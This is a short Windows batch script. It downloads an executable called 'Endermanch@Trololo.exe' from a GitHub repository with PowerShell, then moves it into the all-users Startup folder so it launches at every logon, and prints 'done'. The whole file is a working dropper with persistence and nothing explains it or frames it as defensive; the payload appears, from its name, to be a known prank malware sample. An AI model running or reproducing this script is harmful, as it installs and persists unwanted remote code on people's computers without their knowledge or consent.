@echo on
powershell Invoke-WebRequest -Uri "https://github.com/saawkt/files/raw/refs/heads/main/archived/school/Endermanch@Trololo.exe" -OutFile "C:\Windows\Temp\trololo.exe"
move "C:\Windows\Temp\trololo.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" >nul 2>&1
cls
echo done
pause
exit /b 